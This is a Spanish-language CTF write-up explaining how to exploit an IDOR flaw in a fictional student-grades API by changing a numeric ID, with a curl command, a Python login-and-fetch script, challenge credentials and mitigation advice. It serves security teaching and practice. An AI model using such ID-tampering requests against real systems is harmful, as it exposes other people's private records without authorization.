# EduLab — Las notas de Manuel

| | |
|---|---|
| **Categoría** | Web |
| **Dificultad** | Fácil |
| **Puntos** | 100 |
| **Reto #** | 01 |
| **Instancia** | `http://chals.tropicalhunters.com:9015` |
| **Credenciales** | `ana` / `VPJPW5HAYuAUP8uf` |

## Descripción

EduLab es el campus virtual de AeroCampus. El módulo *Mis calificaciones* muestra las notas de cada alumno por identificador numérico. El objetivo es acceder al registro privado de **Manuel** sin conocer su contraseña.

## Vulnerabilidad

**IDOR — Insecure Direct Object Reference (CWE-639)**

El endpoint de la API construye la consulta con el ID que el cliente envía en la URL, sin verificar en el servidor que ese ID corresponda al usuario de la sesión. Cualquier usuario autenticado puede cambiar el número y leer los datos de otro alumno.

## Solución

### 1. Autenticarse e identificar el endpoint

Tras iniciar sesión, abrir **DevTools → Network** (filtrar por *Fetch/XHR*) y visitar *Mis calificaciones*:

```
GET /api/grades/1001   →  200 OK   (ID de ana)
```

### 2. Explotar el IDOR

Cambiar el ID en la URL a `1002` (Manuel):

```bash
curl -sb cookies.txt \
  "http://chals.tropicalhunters.com:9015/api/grades/1002"
```

La respuesta JSON incluye el campo `note` del curso *Seguridad Operacional*, que contiene la flag.

### 3. Script automatizado

```python
import requests

s = requests.Session()
s.post("http://chals.tropicalhunters.com:9015/api/auth/login",
       json={"username": "ana", "password": "VPJPW5HAYuAUP8uf"})

r = s.get("http://chals.tropicalhunters.com:9015/api/grades/1002")
for grade in r.json()["grades"]:
    if grade["course"] == "Seguridad Operacional":
        print(grade["note"])
```

> 🚩 **Flag:** omitida intencionalmente. Seguí los pasos para obtenerla.

## Mitigación

- Validar en el backend que el ID solicitado coincida con el usuario autenticado.
- Usar UUIDs no predecibles como defensa en profundidad (no reemplaza la validación de autorización).
- Registrar accesos a recursos ajenos a la sesión activa.

---
*Tropical Hunters CTF — Writeup por [Fabián Bustamante](https://github.com/fbustamante55)*
